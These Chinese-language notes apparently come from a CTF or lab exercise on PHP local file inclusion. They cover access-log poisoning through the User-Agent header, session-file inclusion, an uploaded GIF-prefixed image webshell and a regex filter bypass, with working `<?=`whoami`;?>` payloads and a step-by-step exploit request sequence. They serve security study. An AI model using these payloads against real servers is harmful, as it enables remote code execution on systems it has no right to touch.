## 二、知识点

### 1. 三条链的共同骨架

```
① 我能往哪里写东西？        → 找"写入口"
② 写进去的东西会被转义吗？   → 选入口
③ 我能 include 到它吗？     → 拼路径
```

之前的错误是直接从 ③ 开始想 payload，跳过了 ① 和 ②。

### 2. 三者的写入口与路径

| 链 | 写入口 | 文件路径 | 依赖 |
|---|---|---|---|
| 日志包含 | `User-Agent` 头 | `/var/log/nginx/access.log` | 日志可读、Nginx 不转义 |
| session 包含 | 昵称（存进 session） | `/tmp/sess_<id>` | 知道 session 路径 |
| 上传 + 包含 | 上传点 | `uploads/shell.jpg` | 有上传点、可包含 |

### 3. 为什么 UA 是最好的日志写入口

HTTP 请求行、UA、Referer 都会被原样写进 access.log。UA 最方便，因为**它不参与 URL 编码，可以塞任意字符**。

Apache 会把 `<` `>` `"` 转义成 `\x3C` 这类形式，代码失效；Nginx 原样记录。

### 4. session 文件里为什么代码能执行

session 文件的内容长这样：

```
nick|s:26:"<?=`whoami`;?>";
```

`include` 把**整个文件**当 PHP 解析：

- `nick|s:26:"` 是普通文本，原样输出
- 遇到 `<?=` 开始执行，到 `?>` 结束
- 后面的 `";` 又是普通文本

**关键**：不需要文件里"全是 PHP 代码"，只要中间有一段合法的 `<?= ?>` 就够了。

### 5. 过滤封了伪协议之后往哪走

题目过滤：

```php
if (preg_match('/php:|data:|input|\.\.\//i', $page)) { die('no'); }
```

| 尝试 | 结果 | 原因 |
|---|---|---|
| `php://filter/...` | 被拦 | 命中 `php:`，`i` 让大小写绕过也无效 |
| `pphphp://filter/...` | 被拦 | 双写后仍含 `php:` 子串 |
| `uploads/shell.jpg` | **成功** | 不含任何被禁字符串 |

**判断**：过滤封的是**伪协议**，没封"包含站内文件"。所以转向上传点。

### 6. 为什么"先发一个正常请求"是必须的

以 `page=about.php` 为例，这一步同时做三件事：

| 目的 | 说明 |
|---|---|
| 确认功能正常 | 404/500 说明路径或参数名错了 |
| 证明参数控制 include | 换成别的文件，输出跟着变，漏洞成立 |
| 建立基线 | 记住正常输出，后面才知道"这次真的执行了" |

真实题目里没有 `mode` 参数，只有一个 `?page=` 或 `?file=`。确认靠传一个不存在的文件看报错：

```
Warning: include(no_such_file_123.php): failed to open stream
```

看到 `include()` 字样就等于确认了。

### 7. HTTP 请求行的五步处理

```
GET /demo.php?mode=log&page=about.php HTTP/1.1
```

| 步 | 服务端做什么 |
|---|---|
| ① 路由 | 把 `/demo.php` 交给 PHP 执行 |
| ② 解析 | 查询串变成 `$_GET['mode']`、`$_GET['page']` |
| ③ 分支 | 进入 `$mode === 'log'` 的代码块 |
| ④ 包含 | `include('about.php')`，相对当前工作目录 |
| ⑤ 输出 | 被包含文件当 PHP 执行，结果拼进响应 |

## 三、案例 / 命令

```
① GET /demo.php?mode=log&page=about.php
   → 这是 about 页面                     确认能包含

② GET /demo.php?mode=log
   User-Agent: <?=`whoami`;?>
   → 日志里出现 GET /?ua=<?=`whoami`;?> 200

③ GET /demo.php?mode=log&page=access.log
   → GET /?ua=laptop-59ul2kdl\...        执行了
```

## 四、踩坑

| 坑 | 现象 | 原因 / 解决 |
|---|---|---|
| PowerShell 变量插值吞掉 `?` | 请求变成 `=log&page=about.php`，报"无效的 URI" | `"$b?mode"` 被当成变量 `$b?mode`；要写 `"${b}?mode"` |
| PowerShell 吃掉反引号 | 图片马内容变成空 | 双引号里 `` ` `` 是转义符；改用单引号 `'GIF89a<?=`whoami`;?>'` |
| `-Uri "..." + 变量` 报错 | 找不到位置形式参数 | PowerShell 里 `+` 拼接要整体加括号，或先拼成变量 |
| session_id 没解析出来 | include 了 `sess/sess_` | 正则没匹配上；改成 `[regex]::Match($c, 'session_id = ([a-z0-9]+)')` |
| `str_replace('php','')` 双写位置 | `phpphp` 失效 | 两个 `php` 都被扫到；正确是 `pphphp` |
